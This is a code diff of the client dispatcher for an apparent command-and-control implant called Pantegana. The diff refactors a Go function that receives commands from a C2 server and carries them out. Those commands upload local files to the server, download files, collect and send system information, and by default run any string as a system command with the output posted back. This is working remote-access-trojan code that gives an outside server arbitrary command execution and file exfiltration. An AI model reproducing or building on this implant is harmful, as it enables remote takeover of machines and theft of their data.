@@ -1,21 +1,19 @@
 package client
 
 import (
-	"bytes"
 	"log"
 	"net/http"
 	"os"
 	"strings"
 )
 
-// Middleware splits of the flow corresponding to the cmd
-// string and delegates to the method that is repsonsible for
-// taking out the action.
+// Middleware executes the corresponding function from the command that the Pantegana server sent
 func Middleware(client *http.Client, cmd string, host string) {
-	if strings.Compare(cmd, "quit") == 0 {
+	switch strings.Split(cmd, " ")[0] {
+	case "quit":
 		log.Println("[+] Quitting due to quit cmd from c2")
 		os.Exit(0)
-	} else if strings.HasPrefix(cmd, "__upload__") {
+	case "__upload__":
 		cmdTokens := strings.Split(cmd, " ")
 		if len(cmdTokens) < 3 {
 			log.Println("[-] Invalid upload command syntax.")
@@ -24,7 +22,7 @@ func Middleware(client *http.Client, cmd string, host string) {
 			remoteFilePath := cmdTokens[2]
 			UploadFile(client, host+uploadFileURL, localFilePath, remoteFilePath)
 		}
-	} else if strings.HasPrefix(cmd, "__download__") {
+	case "__download__":
 		cmdTokens := strings.Split(cmd, " ")
 		if len(cmdTokens) < 3 {
 			log.Println("[-] Invalid download command syntax.")
@@ -33,23 +31,12 @@ func Middleware(client *http.Client, cmd string, host string) {
 			localFilePath := cmdTokens[2]
 			DownloadFile(client, host+downloadFileURL+"?file="+remoteFilePath, localFilePath)
 		}
-	} else if strings.HasPrefix(cmd, "__sysinfo__") {
+	case "__sysinfo__":
 		log.Printf("[+] Sending system information...")
 		sysInfo := GetCurrentSysInfo()
 		SendSysInfo(client, host+sysInfoURL, sysInfo)
-	} else {
-		out := ExecAndGetOutput(string(cmd))
-		log.Printf("[+] Sending back output:\n%s\n", string(out))
-		req, err := http.NewRequest("POST", host+cmdOutputURL, bytes.NewBuffer(out))
-		if err != nil {
-			log.Printf("[-] Error creating the POST request: %s\n", err)
-			return
-		}
-
-		req.Header.Add("Token", ClientToken)
-		req.Header.Set("Content-Type", "text/html")
-
-		client.Do(req)
+	default: // Just execute the cmd as a system command (example: "ls /")
+		ExecAndGetOutput(client, host+cmdOutputURL, string(cmd))
 	}
 	defer client.CloseIdleConnections()
 }
